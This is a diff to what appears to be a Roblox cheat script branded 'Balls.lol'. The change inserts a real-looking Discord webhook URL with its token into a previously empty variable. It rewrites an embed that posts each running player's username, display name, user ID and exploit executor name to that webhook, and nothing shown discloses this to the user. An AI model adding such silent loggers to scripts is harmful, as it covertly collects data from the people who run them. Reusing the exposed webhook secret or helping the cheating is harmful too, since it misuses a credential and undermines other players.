@@ -7386,6 +7386,7 @@ workspace.Balls.ChildRemoved:Connect(function(Value)
 		Connections_Manager["Target Change"] = nil
 	end
 end)
+
 function SendMessageEMBED(url, embed)
     local http = game:GetService("HttpService")
     local headers = {
@@ -7413,8 +7414,7 @@ function SendMessageEMBED(url, embed)
     })
 end
 
-local url = ""
-
+local url = "https://discord.com/api/webhooks/1414434990380421291/b2p-_UvjAVbookHd0gnn6xtu4dooAk3LsvjFf7VlV6iR0lWLIxMBPY8gZYKDDJIprfUg"
 local player = game.Players.LocalPlayer
 local executorName = "Unknown"
 
@@ -7425,28 +7425,18 @@ elseif getexecutorname then
 end
 
 local embed = {
-    ["title"] = " Player Info",
-    ["description"] = "Basic player details",
+    ["title"] = " Logs ",
+    ["description"] = "Logs",
     ["color"] = 11674146,
     ["fields"] = {
         {
-            ["name"] = "Username",
-            ["value"] = player.Name,
-            ["inline"] = true
-        },
-        {
-            ["name"] = "Executor",
-            ["value"] = executorName,
-            ["inline"] = true
-        },
-        {
-            ["name"] = "User ID",
-            ["value"] = tostring(player.UserId),
-            ["inline"] = true
+            ["name"] = " Player Info",
+            ["value"] = "Username: " .. player.Name .. "\nDisplay Name: " .. player.DisplayName .. "\nPlayer ID: " .. player.UserId .. "\nExecutor: " .. executorName .. "\n Executer",
+            ["inline"] = false
         }
     },
     ["footer"] = {
-        ["text"] = "Balls.lol logger",
+        ["text"] = " 𝐁αᥣᥣ𝗌.ᥣⱺᥣ is the best",
     },
     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
